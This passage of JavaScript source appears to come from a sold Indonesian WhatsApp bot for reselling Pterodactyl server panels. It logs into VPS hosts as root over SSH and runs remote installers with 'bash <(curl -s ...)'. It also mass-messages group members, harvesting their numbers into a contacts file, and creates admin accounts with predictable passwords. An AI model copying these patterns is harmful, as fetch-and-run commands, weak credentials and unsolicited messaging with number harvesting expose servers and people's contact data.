m.reply('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
m.reply('Katasandi atau IP tidak valid')
}).connect(connSettings)
}
break
    case "done": {
if (!isOwner) return ReplyX(` Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin `)
if (!q) return ReplyX("Nokos Canada")
const msg = {
text: `*Transaksi Done ✅*
📦 ${text}

_*© 2024 - Xin*_`
}
await xin.sendMessage(m.chat, msg, {quoted: null})
}
break


	case "speed":
	 ReplyX(`*${moment.duration(Date.now() - parseInt(m.messageTimestamp.toString()) * 1000).asSeconds()} Seconds*`)
				break
	
			case "runtime":
			ReplyX(`Current Runtime:\n${runtime(process.uptime())}`)
				break
				
//==========================
case "pushkontak": {
if (!isOwner) return ReplyX("Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin")
if (!isGroup) return ReplyX("Khusus Dalam Group!")
if (!text) return m.reply("Mana Teksnya?")
var teks = text
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./gudang/database/ctcs.json', JSON.stringify(contacts))
await xin.sendMessage(mem, {text: teks}, {quoted: qctc})
await sleep(6500)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./gudang/database/ctc.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await xin.sendMessage(m.sender, { document: fs.readFileSync("./gudang/database/ctc.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./gudang/database/ctcs.json", JSON.stringify(contacts))
await fs.writeFileSync("./gudang/database/ctc.vcf", "")
}}
break			  
 case "pushkontak2": {
if (!isOwner) return ReplyX(`Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin 👍🏻`)
if (!text) return m.reply("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup")
if (!text.split("|")) return m.reply("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup")
var [idnya, teks] = text.split("|")
var groupMetadataa
try {
groupMetadataa = await xin.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./gudang/database/ctcs.json', JSON.stringify(contacts))
await xin.sendMessage(mem, {text: teks}, {quoted: qpayment})
await sleep(7200)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./gudang/database/ctc.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await xin.sendMessage(m.sender, { document: fs.readFileSync("./gudang/database/ctc.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./gudang/database/ctcs.json", JSON.stringify(contacts))
await fs.writeFileSync("./gudang/database/ctc.vcf", "")
}}
break
 // SPanelmenu //
            case "listserver": {
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!isOwner) return ReplyX(` Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin Cik `)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "*List Servers *\n\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\`🔋 ID Server ${s.id}\`
* Nama Server : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Storage : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n\n`
}

messageText += ` Total Server : *${res.meta.pagination.count} Server*`;
  
  await xin.sendMessage(m.chat, { text: messageText }, { quoted: qstore })
}
break
case "deladmin": {
if (!isOwner) return ReplyX(`Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin`)
if (!args[0]) return ReplyX("Syntax Error\n .deladmin ID")
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("ID Admin Tidak Ditemukan!")
m.reply(`Berhasil Menghapus Admin Panel *${getid}*`)
}
break
case "listadmin": {
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let totaladmin = 0
if (users.length < 1 ) return m.reply("Tidak Ada Admin Panel")
var teks = " *List Adp*\n\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
totaladmin += 1
teks += `\`📡ID User ${i.attributes.id}\`
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n\n`
})
teks += ` Total Admin : *${totaladmin} Admin*`
xin.sendText(m.chat, teks, qstore)
}
break
case "delpanel": {
if (!isOwner) return ReplyX(`Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin`)
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!args[0]) return ReplyX("idservernya\n\nuntuk melihat id server ketik *.listserver*")
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections = []
for (let server of servers) {
let s = server.attributes
if (args[0] == s.id.toString()) {
sections.push(s.name.toLowerCase())
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (sections.includes(u.username)) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections.length == 0) return m.reply("*ID Server/User* Tidak Ditemukan\n Silahkan Cek Di Panel Anda Mungkin Commandbot Rusak")
m.reply(`Berhasil Menghapus Akun Panel *${sections[0]}*`)
}
break
            case "shortlink": 
            case "shorturl": {
                if (!text) return ReplyX(`Contoh: ${prefix + command} https://showmypenis`);
                if (!isUrl(text)) return ReplyX(`Contoh: ${prefix + command} https://showmypenis`);
            
                var res = await axios.get('https://tinyurl.com/api-create.php?url=' + encodeURIComponent(text));
                var link = `\n*Shortlink by TinyURL*\n${res.data.toString()}`;
            
                await ReplyX(link);
            }
break
case 'listsrv': {
	if (!isOwner) return ReplyX(`Maaf, Anda tidak dapat melihat daftar server.`);
	let page = args[0] ? args[0] : '1';
	let f = await fetch(domain + "/api/application/servers?page=" + page, {
	  "method": "GET",
	  "headers": {
		"Accept": "application/json",
		"Content-Type": "application/json",
		"Authorization": "Bearer " + apikey
	  }
	});
	let res = await f.json();
	let servers = res.data;
	let sections = [];
	let messageText = "Berikut adalah daftar server:\n\n";
	
	for (let server of servers) {
	  let s = server.attributes;
	  
	  let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
		"method": "GET",
		"headers": {
		  "Accept": "application/json",
		  "Content-Type": "application/json",
		  "Authorization": "Bearer " + capikey
		}
	  });
	  
	  let data = await f3.json();
	  let status = data.attributes ? data.attributes.current_state : s.status;
	  
	  messageText += `ID Server: ${s.id}\n`;
	  messageText += `Nama Server: ${s.name}\n`;
	  messageText += `Status: ${status}\n\n`;
	}
	
	messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
	messageText += `Total Server: ${res.meta.pagination.count}`;
	
	await xin.sendMessage(m.chat, { text: messageText }, { quoted: qstore });
	
	if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
	  ReplyX(`Gunakan perintah .listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
	}
  }
  break;
  case 'createadmin': {
	if (!isOwner) return ReplyX(mess.only.owner)
	let s = q.split(',')
	let email = s[0];
	let username = s[0]
	let nomor = s[1]
	if (s.length < 2) return ReplyX(`*Syntax Error!*
	Penggunaan:
	${prefix + command} user,nomer`)
	if (!username) return ReplyX(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
	if (!nomor) return ReplyX(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
	let password = username + "46093"
	let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
	let f = await fetch(domain + "/api/application/users", {
	"method": "POST",
	"headers": {
	"Accept": "application/json",
	"Content-Type": "application/json",
	"Authorization": "Bearer " + apikey
	},
	"body": JSON.stringify({
	"email": username + "@gmail.com",
	"username": username,
	"first_name": username,
	"last_name": "admin",
	"language": "en",
	 "root_admin" : true,  
	"password": password.toString()
	})
	
	})
	
	let data = await f.json();
	
	if (data.errors) return ReplyX(JSON.stringify(data.errors[0], null, 2));
	
	let user = data.attributes
	
	let tks = `
	Sukses Generate Akun Admin Panel!
	
	📡ID: ${user.id}
	🌷UUID: ${user.uuid}
	👤USERNAME: ${user.username}
	📬EMAIL: ${user.email}
	🦖NAME: ${user.first_name} ${user.last_name}
	🔥LANGUAGE: ${user.language}
	📊ADMIN: ${user.root_admin}
	☢️CREATED AT: ${user.created_at}
	
	🖥️LOGIN: ${domain}
	`
		const listMessage = {
	
			text: tks,
	
		}
	
		
	
		await xin.sendMessage(m.chat, listMessage)
	
		await xin.sendMessage(nomornya, {
	
			text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n
	USERNAME :  ${username}
	PASSWORD: ${password}
	LOGIN: ${domain}
	
	
	*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
	
	
	`,
	
		})
	
	}
	break	
	case "cadmin-v2": {
if (!isOwner) return ReplyX("Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin")
if (!text) return m.reply("Salah Penggunaan!")
let username = text.toLowerCase()
let email = username + "@xinner.id"
let name = username
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain2}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await xin.sendMessage(orang, {text: teks}, {quoted: m})
}
break

            case 'tourl': {
                if (!/video/.test(mime) && !/image/.test(mime)) return ReplyX(`Reply gambar dengan keterangan/caption ${prefix+command}`);
                let pnis = await m.quoted ? m.quoted : m;
                let media = await pnis.download();
                let link = await TelegraPh(media);
                await sleep(1000);
                await ReplyX(`Here Is Your Link! ${link}`);
            }
					  break			  
			  		
  case "installpanel": {
if (!isOwner) return ReplyX(`Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin`)
if (!text) return ReplyX("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*")
let vii = text.split("|")
if (vii.length < 5) return ReplyX("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*")
let sukses = false

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await xin.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By Xinbot\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By Xinbot\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await m.reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}
break  
    case "startwings": {
if (!isOwner) return ReplyX(`Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin`)
let t = text.split('|')
if (t.length < 3) return ReplyX("Cara Penggunaan: IPVps|PwVps|Token")

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break 
           case '1gb': {
if (!isPrem && !isReseller) return ReplyX(`Fitur Ini Khusus Premium & Reseller`)
let t = text.split(',');
if (t.length < 2) return ReplyX(`*Syntax Error!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "1050"
let cpu = "30"
let disk = "1050"
let email = username + "@xinner.id"
try {
if (!u) return
let d = (await xin.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return ReplyX(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `Hai @${u.split`@`[0]}
Paket Anda Telah Datang 📦
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}

*Rules & Catatan Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 20 Hari (2x replace)
* Buyer TIDAK Boleh Memasang Script DDos Pada Panel
* Jika Password Salah Maka Ganti 001 menjadi 100800 
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
============== © Xin ==============
`
xin.sendMessage(u, { caption: ctf, image: P1, quoted: qpayment });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": -1,
"disk": disk,
"io": 10,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ReplyX(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await ReplyX(`
Successfully Added User + Server To Database Panel!
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  ReplyX('Error\n Invalid PTLA / PTLC. Silahkan cek kembali')
}

}

break
case '2gb': {
if (!isPrem && !isReseller) return ReplyX(`Fitur Ini Khusus Premium & Reseller`)
let t = text.split(',');
if (t.length < 2) return ReplyX(`*Syntax Error!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "2070"
let cpu = "60"
let disk = "2070"
let email = username + "@xinner.id"
try {
if (!u) return
let d = (await xin.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return ReplyX(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `Hai @${u.split`@`[0]}
Paket Anda Telah Datang 📦
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}

*Rules & Catatan Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 20 Hari (2x replace)
* Buyer TIDAK Boleh Memasang Script DDos Pada Panel
* Jika Password Salah Maka Ganti 001 menjadi 100800 
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
============== © Xin ==============
`
xin.sendMessage(u, { caption: ctf, image: P1, quoted: qpayment });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": -1,
"disk": disk,
"io": 10,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ReplyX(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await ReplyX(`
Successfully Added User + Server To Database Panel!
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  ReplyX('Error\n Invalid PTLA / PTLC. Silahkan cek kembali')
}
}

break
case '3gb': {
if (!isPrem && !isReseller) return ReplyX(`Fitur Ini Khusus Premium & Reseller`)
let t = text.split(',');
if (t.length < 2) return ReplyX(`*Syntax Error!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "3090"
let cpu = "90"
let disk = "3090"
let email = username + "@xinner.id"
try {
if (!u) return
let d = (await xin.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return ReplyX(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
